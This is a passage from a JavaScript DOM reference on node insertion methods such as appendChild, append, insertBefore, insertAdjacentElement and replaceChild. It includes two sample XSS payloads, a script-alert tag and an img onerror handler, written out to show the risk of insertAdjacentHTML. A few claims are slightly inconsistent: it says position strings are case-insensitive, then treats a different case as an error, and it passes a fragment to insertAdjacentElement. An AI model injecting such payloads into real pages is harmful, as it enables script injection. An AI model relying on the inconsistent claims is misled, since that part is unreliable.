```

#### Cannot Append Node to Itself

```javascript
element.appendChild(element);  // HierarchyRequestError
```

#### Cloning vs Moving

```javascript
const original = document.getElementById('item');
const container1 = document.getElementById('container1');
const container2 = document.getElementById('container2');

// This moves, not copies
container1.appendChild(original);
container2.appendChild(original);  // Now only in container2

// To copy, use cloneNode
container1.appendChild(original);
container2.appendChild(original.cloneNode(true));  // Now in both
```

#### Return Value with DocumentFragment

```javascript
const fragment = document.createDocumentFragment();
fragment.appendChild(div1);
fragment.appendChild(div2);

const returned = parent.appendChild(fragment);
console.log(returned === fragment);  // true
console.log(fragment.childNodes.length);  // 0 - fragment is now empty
```

### Comparison with Other Insertion Methods

#### vs insertBefore

```javascript
// appendChild - always inserts at end
parent.appendChild(newChild);

// insertBefore - inserts before reference node
parent.insertBefore(newChild, referenceChild);

// insertBefore to append at end
parent.insertBefore(newChild, null);  // Equivalent to appendChild
```

#### vs append (Modern)

```javascript
// appendChild - single node, returns the node
const returned = parent.appendChild(element);

// append - multiple nodes/strings, returns undefined
parent.append(element1, element2, 'text');
parent.append(...arrayOfNodes);
```

`append()` is more flexible but `appendChild()` has broader compatibility and returns the appended node.

#### vs innerHTML

```javascript
// appendChild - programmatic, preserves references
const div = document.createElement('div');
parent.appendChild(div);
div.addEventListener('click', handler);  // Event listener preserved

// innerHTML - string-based, destroys references
parent.innerHTML += '<div></div>';  // Replaces all content, loses event listeners
```

#### vs insertAdjacentElement

```javascript
// appendChild
parent.appendChild(element);

// insertAdjacentElement equivalent
parent.insertAdjacentElement('beforeend', element);
```

### Integration with Modern APIs

#### Shadow DOM

```javascript
const host = document.getElementById('host');
const shadowRoot = host.attachShadow({ mode: 'open' });

const content = document.createElement('div');
content.textContent = 'Shadow content';
shadowRoot.appendChild(content);
```

#### Template Elements

```javascript
const template = document.getElementById('template');
const clone = template.content.cloneNode(true);
container.appendChild(clone);
```

#### Custom Elements

```javascript
class MyComponent extends HTMLElement {
  connectedCallback() {
    const wrapper = document.createElement('div');
    wrapper.className = 'wrapper';
    
    // Move existing children into wrapper
    while (this.firstChild) {
      wrapper.appendChild(this.firstChild);
    }
    
    this.appendChild(wrapper);
  }
}
```

### Event Handling Considerations

#### Events During Append

Appending elements can trigger various events and callbacks:

```javascript
const observer = new MutationObserver((mutations) => {
  console.log('DOM changed');
});
observer.observe(parent, { childList: true });

parent.appendChild(element);  // Triggers mutation observer
```

#### Preserved Event Listeners

```javascript
const button = document.createElement('button');
button.addEventListener('click', handler);

container1.appendChild(button);
container2.appendChild(button);  // Event listener still attached after move
```

#### DOMNodeInserted (Deprecated)

```javascript
// Legacy approach - avoid in new code
parent.addEventListener('DOMNodeInserted', (event) => {
  console.log('Node inserted:', event.target);
});

parent.appendChild(element);  // Triggers event
```

Use `MutationObserver` instead for monitoring DOM changes.

### Memory and Lifecycle

#### Garbage Collection

```javascript
let element = document.createElement('div');
parent.appendChild(element);

element = null;  // Element not garbage collected - still in DOM
```

The element remains in memory as long as it's part of the DOM tree.

#### Removing References

```javascript
const element = document.createElement('div');
parent.appendChild(element);

parent.removeChild(element);  // Now eligible for garbage collection if no other references exist
```

#### Detached Subtrees

```javascript
const container = document.createElement('div');
const child = document.createElement('div');
container.appendChild(child);

// container and child exist in memory but not in document
// Will be garbage collected when no references remain
```

### Error Handling

#### Common Errors

```javascript
try {
  parent.appendChild(null);
} catch (e) {
  // TypeError: Failed to execute 'appendChild' on 'Node': parameter 1 is not of type 'Node'
}

try {
  const text = document.createTextNode('text');
  text.appendChild(element);
} catch (e) {
  // TypeError: text.appendChild is not a function
}

try {
  parent.appendChild(parent);
} catch (e) {
  // DOMException: Failed to execute 'appendChild' on 'Node': The new child element contains the parent
}
```

#### Safe Append Pattern

```javascript
function safeAppendChild(parent, child) {
  if (!parent || typeof parent.appendChild !== 'function') {
    throw new Error('Invalid parent node');
  }
  
  if (!child || !child.nodeType) {
    throw new Error('Invalid child node');
  }
  
  try {
    return parent.appendChild(child);
  } catch (e) {
    console.error('Failed to append child:', e);
    throw e;
  }
}
```

### Advanced Patterns

#### Conditional Insertion

```javascript
function appendIfUnique(parent, child, compareFn) {
  const existing = Array.from(parent.children).find(c => compareFn(c, child));
  
  if (!existing) {
    parent.appendChild(child);
    return true;
  }
  return false;
}
```

#### Ordered Insertion

```javascript
function appendSorted(parent, child, compareFn) {
  const children = Array.from(parent.children);
  const insertIndex = children.findIndex(c => compareFn(child, c) < 0);
  
  if (insertIndex === -1) {
    parent.appendChild(child);
  } else {
    parent.insertBefore(child, children[insertIndex]);
  }
}
```

#### Virtual Scrolling Integration

```javascript
class VirtualList {
  appendChild(item) {
    const element = this.createElement(item);
    
    if (this.isInViewport(item)) {
      this.container.appendChild(element);
    } else {
      this.virtualNodes.push(element);
    }
  }
  
  createElement(item) {
    const div = document.createElement('div');
    div.textContent = item.text;
    div.dataset.id = item.id;
    return div;
  }
}
```

#### Lazy Loading Children

```javascript
function appendWithLazyContent(parent, createContentFn) {
  const placeholder = document.createElement('div');
  placeholder.className = 'loading';
  parent.appendChild(placeholder);
  
  requestIdleCallback(() => {
    const content = createContentFn();
    parent.replaceChild(content, placeholder);
  });
}
```

### Framework Interoperability

#### React

```javascript
// Avoid direct appendChild in React components
// Use refs for imperative DOM manipulation
function Component() {
  const containerRef = useRef(null);
  
  useEffect(() => {
    const externalElement = getExternalElement();
    containerRef.current.appendChild(externalElement);
    
    return () => {
      containerRef.current.removeChild(externalElement);
    };
  }, []);
  
  return <div ref={containerRef}></div>;
}
```

#### Vue

```javascript
export default {
  mounted() {
    const element = document.createElement('div');
    this.$el.appendChild(element);
  },
  beforeUnmount() {
    // Clean up if needed
  }
}
```

### Browser Compatibility

Supported in all browsers including Internet Explorer 5.5+. The behavior has been consistent across browser versions, making it one of the most reliable DOM manipulation methods.

### Testing Patterns

#### Unit Testing

```javascript
describe('appendChild', () => {
  it('should append element as last child', () => {
    const parent = document.createElement('div');
    const child1 = document.createElement('span');
    const child2 = document.createElement('span');
    
    parent.appendChild(child1);
    parent.appendChild(child2);
    
    expect(parent.lastChild).toBe(child2);
    expect(parent.children.length).toBe(2);
  });
  
  it('should move existing elements', () => {
    const parent1 = document.createElement('div');
    const parent2 = document.createElement('div');
    const child = document.createElement('span');
    
    parent1.appendChild(child);
    expect(parent1.children.length).toBe(1);
    
    parent2.appendChild(child);
    expect(parent1.children.length).toBe(0);
    expect(parent2.children.length).toBe(1);
  });
});
```

---

## append and prepend Methods

### Method Signatures and Return Value

```javascript
parentNode.append(...nodesOrStrings)
parentNode.prepend(...nodesOrStrings)
```

Both methods return `undefined`. They add nodes or text to a parent element.

### Basic Behavior

**append** adds content at the end (as last children):

```javascript
const div = document.querySelector('div');
div.append('Text'); // Adds text node at the end
```

**prepend** adds content at the beginning (as first children):

```javascript
const div = document.querySelector('div');
div.prepend('Text'); // Adds text node at the beginning
```

### Multiple Arguments

Both methods accept multiple arguments in a single call:

```javascript
const div = document.querySelector('div');
const span1 = document.createElement('span');
const span2 = document.createElement('span');

div.append(span1, 'Some text', span2);
// Adds all three in order: span1, text node, span2

div.prepend('First', span1, 'Second');
// Adds all three at the beginning in order
```

### String Handling

Strings are automatically converted to text nodes:

```javascript
const div = document.createElement('div');

div.append('Hello'); // Creates text node with "Hello"
div.append('<span>HTML</span>'); // Creates text node, NOT parsed as HTML

console.log(div.innerHTML); // "Hello<span>HTML</span>" (literal text)
```

### Node vs String Distinction

```javascript
const div = document.querySelector('div');

// String becomes text node
div.append('Text content');

// Element node is inserted
const span = document.createElement('span');
span.textContent = 'Text content';
div.append(span);

// These produce different results:
// First: plain text
// Second: <span>Text content</span>
```

### Node Relocation

Appending an existing node moves it (doesn't clone):

```javascript
<div id="a"><span id="item">Item</span></div>
<div id="b"></div>

const item = document.getElementById('item');
const divB = document.getElementById('b');

divB.append(item); // Moves item from div#a to div#b
```

After execution:

```html
<div id="a"></div>
<div id="b"><span id="item">Item</span></div>
```

### DocumentFragment Handling

Appending a DocumentFragment inserts its children and empties the fragment:

```javascript
const fragment = document.createDocumentFragment();
fragment.append(
    document.createElement('div'),
    document.createElement('span')
);

const container = document.querySelector('.container');
container.append(fragment);

console.log(fragment.children.length); // 0 (fragment is now empty)
console.log(container.children.length); // 2 (children were moved)
```

### Prepend Ordering

Multiple prepend calls add in reverse visual order:

```javascript
const div = document.querySelector('div');

div.prepend('First');
div.prepend('Second');
div.prepend('Third');

console.log(div.textContent); // "ThirdSecondFirst"
```

**[Inference]** Each prepend adds before all existing content, so the last prepend appears first.

Single prepend with multiple arguments maintains argument order:

```javascript
const div = document.querySelector('div');

div.prepend('First', 'Second', 'Third');

console.log(div.textContent); // "FirstSecondThird"
```

### Return Value Implications

Both methods return `undefined`, cannot be chained directly:

```javascript
const div = document.createElement('div');

// This doesn't work as expected:
div.append('Text').append('More'); // Error: cannot read append of undefined

// Must chain the element:
div.append('Text');
div.append('More');

// Or use method chaining on other operations:
document.body.append(
    Object.assign(document.createElement('div'), {
        textContent: 'Content'
    })
);
```

### Comparison with appendChild

**append vs appendChild:**

```javascript
const parent = document.querySelector('div');

// appendChild: single node only, returns the node
const child = document.createElement('span');
const returned = parent.appendChild(child);
console.log(returned === child); // true

// append: multiple nodes/strings, returns undefined
parent.append(child, 'text', document.createElement('div'));
```

Key differences:

- `appendChild` accepts one Node argument; `append` accepts multiple nodes/strings
- `appendChild` returns the appended node; `append` returns `undefined`
- `appendChild` doesn't handle strings; `append` converts strings to text nodes

### Comparison with insertAdjacentElement

```javascript
const reference = document.querySelector('.reference');

// Using append/prepend (parent perspective)
reference.parentElement.append(newElement);

// Using insertAdjacentElement (sibling perspective)
reference.insertAdjacentElement('afterend', newElement);

// prepend equivalent
reference.parentElement.prepend(newElement);
// vs
reference.insertAdjacentElement('afterbegin', newElement);
```

### Common Use Cases

**Building element structures:**

```javascript
const card = document.createElement('div');
card.className = 'card';

const title = document.createElement('h3');
title.textContent = 'Card Title';

const content = document.createElement('p');
content.textContent = 'Card content';

card.append(title, content);
document.body.append(card);
```

**Dynamic list construction:**

```javascript
const list = document.querySelector('ul');
const items = ['Apple', 'Banana', 'Cherry'];

items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    list.append(li);
});
```

**Prepending notifications:**

```javascript
const notifications = document.querySelector('.notifications');

function addNotification(message) {
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.textContent = message;
    
    // New notifications appear at top
    notifications.prepend(notification);
}
```

**Bulk element insertion:**

```javascript
const container = document.querySelector('.container');
const fragment = document.createDocumentFragment();

// Build multiple elements
for (let i = 0; i < 100; i++) {
    const item = document.createElement('div');
    item.textContent = `Item ${i}`;
    fragment.append(item);
}

// Single reflow
container.append(fragment);
```

**Mixed content insertion:**

```javascript
const message = document.querySelector('.message');
const icon = document.createElement('i');
icon.className = 'icon-warning';

message.prepend(icon, ' Warning: ', document.createElement('strong'));
```

### Performance Considerations

**[Inference]** Using DocumentFragment with `append` for multiple elements reduces reflows:

```javascript
// Multiple reflows (less efficient)
for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    container.append(div);
}

// Single reflow (more efficient)
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    fragment.append(div);
}
container.append(fragment);
```

### Edge Cases

**Empty arguments:**

```javascript
const div = document.querySelector('div');

div.append(); // Does nothing
div.prepend(); // Does nothing
```

**Null and undefined:**

```javascript
const div = document.querySelector('div');

div.append(null); // Adds text node "null"
div.append(undefined); // Adds text node "undefined"
```

**Numbers and other primitives:**

```javascript
const div = document.querySelector('div');

div.append(123); // Adds text node "123"
div.append(true); // Adds text node "true"
div.append({}); // Adds text node "[object Object]"
```

**Circular references:**

```javascript
const parent = document.createElement('div');
const child = document.createElement('div');

parent.append(child);

// Cannot create circular structure
// child.append(parent); // Would throw HierarchyRequestError
```

### Browser Compatibility

Supported in all modern browsers. IE11 and older do not support these methods.

Polyfill for older browsers:

```javascript
// [Inference] Simplified polyfill concept
if (!Element.prototype.append) {
    Element.prototype.append = function(...nodes) {
        nodes.forEach(node => {
            if (typeof node === 'string') {
                this.appendChild(document.createTextNode(node));
            } else {
                this.appendChild(node);
            }
        });
    };
}
```

### Alternative Patterns

**Template literals with innerHTML (use cautiously):**

```javascript
// append/prepend (safe, no XSS risk with controlled data)
div.append(document.createElement('span'));

// innerHTML (potential XSS risk with user data)
div.innerHTML += '<span></span>'; // Also destroys event listeners
```

**Using insertBefore for prepend simulation:**

```javascript
// Modern prepend
parent.prepend(child);

// Legacy equivalent
parent.insertBefore(child, parent.firstChild);
```

---

## insertBefore, insertAdjacentElement

### insertBefore

#### Method Signature and Behavior

```javascript
parentNode.insertBefore(newNode, referenceNode)
```

Inserts `newNode` before `referenceNode` as a child of `parentNode`. Returns the inserted node.

**Parameters:**

- `newNode`: The node to insert
- `referenceNode`: The node before which `newNode` is inserted. If `null`, `newNode` is inserted at the end (equivalent to `appendChild`)

**Return value:** The inserted `newNode`

```javascript
const parent = document.getElementById('parent');
const newElement = document.createElement('div');
const referenceElement = document.getElementById('reference');

// Insert newElement before referenceElement
parent.insertBefore(newElement, referenceElement);

// Returns the inserted node
const inserted = parent.insertBefore(newElement, referenceElement);
console.log(inserted === newElement); // true
```

#### Null Reference Node Behavior

When `referenceNode` is `null`, the node is appended to the end:

```javascript
const parent = document.getElementById('parent');
const newElement = document.createElement('div');

// These are equivalent
parent.insertBefore(newElement, null);
parent.appendChild(newElement);
```

This behavior is useful for conditional insertion logic:

```javascript
function insertAtPosition(parent, newNode, insertAtEnd) {
  const reference = insertAtEnd ? null : parent.firstChild;
  parent.insertBefore(newNode, reference);
}
```

#### Moving Existing Nodes

If `newNode` is already in the DOM, `insertBefore` **moves** it rather than cloning:

```javascript
const parent = document.getElementById('parent');
const existingNode = document.getElementById('existing');
const reference = document.getElementById('reference');

// Moves existingNode from its current location
parent.insertBefore(existingNode, reference);

// Original location is now empty
// No need to remove from old location first
```

**Important:** The node is automatically removed from its previous parent:

```javascript
const div1 = document.getElementById('div1');
const div2 = document.getElementById('div2');
const element = document.getElementById('element');

// element is child of div1
console.log(element.parentNode === div1); // true

// Move to div2
div2.insertBefore(element, div2.firstChild);

// Now child of div2, automatically removed from div1
console.log(element.parentNode === div2); // true
```

#### Reference Node Must Be Child of Parent

The `referenceNode` must be a direct child of `parentNode`, or an error is thrown:

```javascript
const parent = document.getElementById('parent');
const grandchild = parent.firstChild.firstChild;
const newNode = document.createElement('div');

// ERROR: grandchild is not a direct child of parent
try {
  parent.insertBefore(newNode, grandchild);
} catch (e) {
  console.log(e); // NotFoundError
}

// Correct: use the direct child
const directChild = parent.firstChild;
parent.insertBefore(newNode, directChild);
```

#### Common Use Cases

**Insert at beginning:**

```javascript
const parent = document.getElementById('list');
const newItem = document.createElement('li');

// Insert at the start
parent.insertBefore(newItem, parent.firstChild);
```

**Insert at specific position:**

```javascript
function insertAtIndex(parent, newNode, index) {
  const children = parent.children;
  
  if (index >= children.length) {
    parent.appendChild(newNode);
  } else {
    parent.insertBefore(newNode, children[index]);
  }
}

// Insert as third child (index 2)
insertAtIndex(parent, newElement, 2);
```

**Insert before matching element:**

```javascript
const parent = document.getElementById('list');
const newItem = document.createElement('li');
newItem.textContent = 'New Item';

// Find first item with data-priority > 5 and insert before it
const children = Array.from(parent.children);
const reference = children.find(child => 
  parseInt(child.dataset.priority) > 5
);

parent.insertBefore(newItem, reference || null);
```

**Sorting/reordering elements:**

```javascript
const parent = document.getElementById('list');
const items = Array.from(parent.children);

// Sort by data attribute
items.sort((a, b) => 
  parseInt(a.dataset.order) - parseInt(b.dataset.order)
);

// Reinsert in sorted order
items.forEach(item => parent.appendChild(item));

// Or using insertBefore to be explicit
items.forEach((item, index) => {
  if (index === 0) {
    parent.insertBefore(item, parent.firstChild);
  } else {
    parent.insertBefore(item, items[index - 1].nextSibling);
  }
});
```

#### DocumentFragment Optimization

When inserting multiple nodes, use `DocumentFragment` to minimize reflows:

```javascript
// Inefficient: causes multiple reflows
for (let i = 0; i < 100; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  list.insertBefore(li, list.firstChild);
}

// Efficient: single reflow
const fragment = document.createDocumentFragment();
const items = [];

for (let i = 0; i < 100; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  items.push(li);
}

// Add in reverse to maintain order when inserting at start
items.reverse().forEach(item => fragment.appendChild(item));
list.insertBefore(fragment, list.firstChild);
```

#### Error Conditions

**HierarchyRequestError:**

```javascript
const parent = document.createElement('div');
const child = document.createElement('span');

// ERROR: Can't insert parent into its own descendant
try {
  child.insertBefore(parent, null);
  parent.appendChild(child); // Now child contains parent
  parent.insertBefore(child, null); // Would create cycle
} catch (e) {
  console.log(e.name); // HierarchyRequestError
}
```

**NotFoundError:**

```javascript
const parent1 = document.createElement('div');
const parent2 = document.createElement('div');
const reference = document.createElement('span');
const newNode = document.createElement('p');

parent2.appendChild(reference);

// ERROR: reference is not a child of parent1
try {
  parent1.insertBefore(newNode, reference);
} catch (e) {
  console.log(e.name); // NotFoundError
}
```

#### Text Nodes and Comments

`insertBefore` works with all node types, not just elements:

```javascript
const parent = document.getElementById('parent');
const reference = parent.firstChild;

// Insert text node
const textNode = document.createTextNode('Hello ');
parent.insertBefore(textNode, reference);

// Insert comment node
const comment = document.createComment('This is a comment');
parent.insertBefore(comment, reference);

// Insert document fragment
const fragment = document.createDocumentFragment();
fragment.appendChild(document.createElement('span'));
parent.insertBefore(fragment, reference);
```

### insertAdjacentElement

#### Method Signature and Behavior

```javascript
element.insertAdjacentElement(position, newElement)
```

Inserts `newElement` at the specified position relative to `element`. Returns the inserted element, or `null` if insertion failed.

**Parameters:**

- `position`: String specifying where to insert (see below)
- `newElement`: The element to insert

**Return value:** The inserted element, or `null` on failure

#### Position Values

Four possible position values:

```javascript
const target = document.getElementById('target');
const newElement = document.createElement('div');

// 'beforebegin': Before the target element itself
target.insertAdjacentElement('beforebegin', newElement);
// <div></div><target>...</target>

// 'afterbegin': Inside target, before its first child
target.insertAdjacentElement('afterbegin', newElement);
// <target><div></div>...existing children...</target>

// 'beforeend': Inside target, after its last child
target.insertAdjacentElement('beforeend', newElement);
// <target>...existing children...<div></div></target>

// 'afterend': After the target element itself
target.insertAdjacentElement('afterend', newElement);
// <target>...</target><div></div>
```

**Visual representation:**

```
<!-- beforebegin -->
<target>
  <!-- afterbegin -->
  existing content
  <!-- beforeend -->
</target>
<!-- afterend -->
```

#### Position Values: Case Sensitivity

[Unverified] The position string is case-insensitive in most modern browsers, but using lowercase is the standard convention and recommended for compatibility:

```javascript
// Standard (recommended)
element.insertAdjacentElement('beforebegin', newEl);

// May work but non-standard
element.insertAdjacentElement('BeforeBegin', newEl);
element.insertAdjacentElement('BEFOREBEGIN', newEl);
```

#### Return Value and Failure Cases

Returns the inserted element on success, `null` on failure:

```javascript
const target = document.getElementById('target');
const newElement = document.createElement('div');

// Success
const result = target.insertAdjacentElement('beforeend', newElement);
console.log(result === newElement); // true

// Failure: invalid position
const failed = target.insertAdjacentElement('invalid', newElement);
console.log(failed); // null

// Failure: 'beforebegin' or 'afterend' on element without parent
const orphan = document.createElement('div');
const result2 = orphan.insertAdjacentElement('beforebegin', newElement);
console.log(result2); // null
```

#### Parent Requirement for beforebegin/afterend

`'beforebegin'` and `'afterend'` require the target element to have a parent:

```javascript
const orphan = document.createElement('div');
const newElement = document.createElement('span');

// Returns null - orphan has no parent
const result1 = orphan.insertAdjacentElement('beforebegin', newElement);
console.log(result1); // null

const result2 = orphan.insertAdjacentElement('afterend', newElement);
console.log(result2); // null

// These work fine - they insert inside the element
const result3 = orphan.insertAdjacentElement('afterbegin', newElement);
console.log(result3 === newElement); // true
```

**Document root limitations:**

```javascript
const html = document.documentElement;
const newElement = document.createElement('div');

// May fail or have unexpected behavior
const result = html.insertAdjacentElement('beforebegin', newElement);
// Can't insert before <html> in valid document structure
```

#### Moving Existing Elements

Like `insertBefore`, if the element already exists in the DOM, it is moved:

```javascript
const container1 = document.getElementById('container1');
const container2 = document.getElementById('container2');
const element = document.getElementById('movable');

// Currently in container1
console.log(element.parentNode === container1); // true

// Move to container2
container2.insertAdjacentElement('beforeend', element);

// Now in container2, removed from container1
console.log(element.parentNode === container2); // true
```

#### Comparison with insertBefore

`insertAdjacentElement` provides more intuitive positioning in some cases:

```javascript
const target = document.getElementById('target');
const newElement = document.createElement('div');

// Using insertAdjacentElement
target.insertAdjacentElement('afterend', newElement);

// Equivalent with insertBefore (more complex)
if (target.nextSibling) {
  target.parentNode.insertBefore(newElement, target.nextSibling);
} else {
  target.parentNode.appendChild(newElement);
}

// Using insertAdjacentElement
target.insertAdjacentElement('beforebegin', newElement);

// Equivalent with insertBefore
target.parentNode.insertBefore(newElement, target);
```

#### Common Use Cases

**Insert sibling elements:**

```javascript
const listItem = document.querySelector('li.active');
const newItem = document.createElement('li');
newItem.textContent = 'New Item';

// Insert right after the active item
listItem.insertAdjacentElement('afterend', newItem);
```

**Wrap element with new parent:**

```javascript
function wrapElement(element, wrapper) {
  element.insertAdjacentElement('beforebegin', wrapper);
  wrapper.appendChild(element);
}

const paragraph = document.querySelector('p');
const div = document.createElement('div');
div.className = 'wrapper';

wrapElement(paragraph, div);
// <div class="wrapper"><p>...</p></div>
```

**Insert at start vs end of container:**

```javascript
const container = document.getElementById('container');
const first = document.createElement('div');
const last = document.createElement('div');

// Add to beginning
container.insertAdjacentElement('afterbegin', first);

// Add to end
container.insertAdjacentElement('beforeend', last);
```

**Build toolbar around element:**

```javascript
const editor = document.getElementById('editor');
const toolbar = document.createElement('div');
const footer = document.createElement('div');

toolbar.className = 'toolbar';
footer.className = 'footer';

// Add toolbar above
editor.insertAdjacentElement('beforebegin', toolbar);

// Add footer below
editor.insertAdjacentElement('afterend', footer);
```

#### Related Methods: insertAdjacentHTML and insertAdjacentText

**insertAdjacentHTML** - Parses HTML string and inserts:

```javascript
const target = document.getElementById('target');

// Insert HTML (parses string as HTML)
target.insertAdjacentHTML('beforeend', '<p>New paragraph</p>');

// More flexible but XSS risk with user input
const userInput = '<script>alert("XSS")</script>';
target.insertAdjacentHTML('beforeend', userInput); // Dangerous!
```

**insertAdjacentText** - Inserts text (safe for user input):

```javascript
const target = document.getElementById('target');

// Insert text safely (no HTML parsing)
target.insertAdjacentText('beforeend', '<script>Not executed</script>');
// Displays literally: <script>Not executed</script>

// Safe for user input
const userInput = '<img src=x onerror="alert()">';
target.insertAdjacentText('beforeend', userInput); // Safe - treated as text
```

**Comparison:**

```javascript
const container = document.getElementById('container');
const element = document.createElement('span');
element.textContent = 'Element';

// insertAdjacentElement - inserts DOM element
container.insertAdjacentElement('beforeend', element);

// insertAdjacentHTML - parses and inserts HTML
container.insertAdjacentHTML('beforeend', '<span>HTML</span>');

// insertAdjacentText - inserts text node
container.insertAdjacentText('beforeend', 'Text');
```

#### Performance Considerations

[Inference] `insertAdjacentElement` is generally faster than `insertAdjacentHTML` when working with pre-created elements, as it avoids HTML parsing overhead:

```javascript
// Faster - no parsing
const div = document.createElement('div');
div.className = 'item';
container.insertAdjacentElement('beforeend', div);

// Slower - invokes HTML parser
container.insertAdjacentHTML('beforeend', '<div class="item"></div>');
```

**Batch insertions:**

```javascript
// Poor: multiple DOM mutations
for (let i = 0; i < 100; i++) {
  const div = document.createElement('div');
  container.insertAdjacentElement('beforeend', div);
}

// Better: use DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
container.insertAdjacentElement('beforeend', fragment);
```

### Comparison: insertBefore vs insertAdjacentElement

|Feature|insertBefore|insertAdjacentElement|
|---|---|---|
|Called on|Parent node|Target element|
|Position control|Before reference child|4 position options|
|Sibling insertion|Requires parent reference|Direct on target|
|Inside insertion|Possible with proper reference|Intuitive (afterbegin/beforeend)|
|Return value|Inserted node|Inserted element or null|
|null reference behavior|Appends to end|N/A|
|Parent requirement|Always|Only for beforebegin/afterend|
|API age|DOM Level 1 (oldest)|DOM Level 4 (newer)|
|Browser support|Universal (IE5+)|Modern (IE11+ partial, full in Edge+)|

### Decision Guide: When to Use Each

**Use insertBefore when:**

- You have a specific reference node to insert before
- You need maximum browser compatibility
- You're working with non-element nodes (text, comments)
- You need null-reference-appends behavior
- You're implementing low-level DOM manipulation libraries

**Use insertAdjacentElement when:**

- You want to insert relative to an element (not necessarily as its child)
- You need to insert siblings without accessing parent
- Position strings ('afterend', 'beforebegin') are more readable for your use case
- You only work with element nodes
- Modern browser support is sufficient

### Common Patterns and Idioms

**Insert before first matching child:**

```javascript
// Using insertBefore
function insertBeforeMatching(parent, newNode, selector) {
  const reference = parent.querySelector(selector);
  parent.insertBefore(newNode, reference);
}

// Using insertAdjacentElement
function insertBeforeMatching(target, newElement) {
  const reference = target.querySelector('.reference');
  if (reference) {
    reference.insertAdjacentElement('beforebegin', newElement);
  }
}
```

**Prepend multiple elements efficiently:**

```javascript
// Using insertBefore with fragment
const fragment = document.createDocumentFragment();
elements.forEach(el => fragment.appendChild(el));
parent.insertBefore(fragment, parent.firstChild);

// Using insertAdjacentElement (one at a time, less efficient)
elements.reverse().forEach(el => {
  parent.insertAdjacentElement('afterbegin', el);
});
```

**Insert sorted into list:**

```javascript
function insertSorted(parent, newElement, compareFn) {
  const children = Array.from(parent.children);
  const insertIndex = children.findIndex(child => 
    compareFn(newElement, child) < 0
  );
  
  if (insertIndex === -1) {
    parent.appendChild(newElement);
  } else {
    parent.insertBefore(newElement, children[insertIndex]);
  }
}

// Usage
insertSorted(list, newItem, (a, b) => 
  parseInt(a.dataset.value) - parseInt(b.dataset.value)
);
```

### Common Pitfalls

**Reference node must be direct child:**

```javascript
const parent = document.getElementById('parent');
const grandchild = parent.querySelector('.deep-nested');
const newNode = document.createElement('div');

// ERROR if grandchild is not a direct child
parent.insertBefore(newNode, grandchild); // NotFoundError
```

**Orphaned element with beforebegin/afterend:**

```javascript
const orphan = document.createElement('div');
const newElement = document.createElement('span');

// Returns null, silently fails
orphan.insertAdjacentElement('beforebegin', newElement);

// Always check return value when using beforebegin/afterend
const result = orphan.insertAdjacentElement('afterend', newElement);
if (!result) {
  console.log('Insertion failed - element has no parent');
}
```

**Forgetting that elements move, not clone:**

```javascript
const element = document.getElementById('movable');
const container1 = document.getElementById('container1');
const container2 = document.getElementById('container2');

// Move to container1
container1.appendChild(element);

// Move to container2 (removes from container1!)
container2.insertAdjacentElement('beforeend', element);

// If you need to clone, use cloneNode
const clone = element.cloneNode(true);
container2.insertAdjacentElement('beforeend', clone);
```

**Position string typos:**

```javascript
// Returns null silently
const result = element.insertAdjacentElement('beforeEnd', newEl); // Wrong case
const result2 = element.insertAdjacentElement('before-end', newEl); // Wrong format

// Always check return value or use constants
const POSITIONS = {
  BEFORE_BEGIN: 'beforebegin',
  AFTER_BEGIN: 'afterbegin',
  BEFORE_END: 'beforeend',
  AFTER_END: 'afterend'
};

element.insertAdjacentElement(POSITIONS.BEFORE_END, newEl);
```

### Browser Compatibility Notes

**insertBefore:** Universal support since DOM Level 1 (IE5+, all modern browsers)

**insertAdjacentElement:**

- Fully supported in modern browsers (Chrome 54+, Firefox 48+, Safari 10+, Edge 17+)
- Partial support in IE11 (some edge cases may differ)
- No support in IE10 and below

For maximum compatibility with older browsers when using position-based insertion:

```javascript
// Polyfill for older browsers
if (!Element.prototype.insertAdjacentElement) {
  Element.prototype.insertAdjacentElement = function(position, element) {
    switch(position.toLowerCase()) {
      case 'beforebegin':
        this.parentNode && this.parentNode.insertBefore(element, this);
        break;
      case 'afterbegin':
        this.insertBefore(element, this.firstChild);
        break;
      case 'beforeend':
        this.appendChild(element);
        break;
      case 'afterend':
        this.parentNode && this.parentNode.insertBefore(element, this.nextSibling);
        break;
    }
    return element;
  };
}
```

---

## replaceChild

### Syntax and Return Value

`replaceChild()` replaces a child node within a parent node with a new node. This method is called on the parent element and returns the replaced (removed) node.

```javascript
let replacedNode = parentNode.replaceChild(newChild, oldChild);
```

**Parameters:**

- `newChild` - The new node to insert
- `oldChild` - The existing child node to be replaced

**Returns:** The replaced node (oldChild)

### Basic Usage

```javascript
<div id="parent">
  <p id="old">Old paragraph</p>
</div>

const parent = document.getElementById('parent');
const oldPara = document.getElementById('old');
const newPara = document.createElement('p');
newPara.textContent = 'New paragraph';

const replaced = parent.replaceChild(newPara, oldPara);
// replaced === oldPara (the removed node)

// DOM now:
// <div id="parent">
//   <p>New paragraph</p>
// </div>
```

### Parent-Child Relationship Requirement

The oldChild **must** be a direct child of the parent node calling `replaceChild`:

```javascript
<div id="parent">
  <div id="wrapper">
    <p id="target">Text</p>
  </div>
</div>

const parent = document.getElementById('parent');
const target = document.getElementById('target');
const newNode = document.createElement('span');

// ❌ WRONG - target is not a direct child of parent
parent.replaceChild(newNode, target); // DOMException: NotFoundError

// ✓ CORRECT - use the direct parent
const wrapper = document.getElementById('wrapper');
wrapper.replaceChild(newNode, target); // Works

// Or access via parentNode
target.parentNode.replaceChild(newNode, target); // Works
```

### Replacing with Existing Nodes

When replacing with a node that already exists in the DOM, that node is **moved**, not cloned:

```javascript
<div id="container1">
  <p id="para1">Paragraph 1</p>
</div>
<div id="container2">
  <p id="para2">Paragraph 2</p>
  <p id="para3">Paragraph 3</p>
</div>

const container2 = document.getElementById('container2');
const para1 = document.getElementById('para1');
const para2 = document.getElementById('para2');

// Move para1 from container1 to container2, replacing para2
container2.replaceChild(para1, para2);

// Result:
// <div id="container1"></div> (empty - para1 moved)
// <div id="container2">
//   <p id="para1">Paragraph 1</p>
//   <p id="para3">Paragraph 3</p>
// </div>
```

To avoid moving, clone first:

```javascript
container2.replaceChild(para1.cloneNode(true), para2);
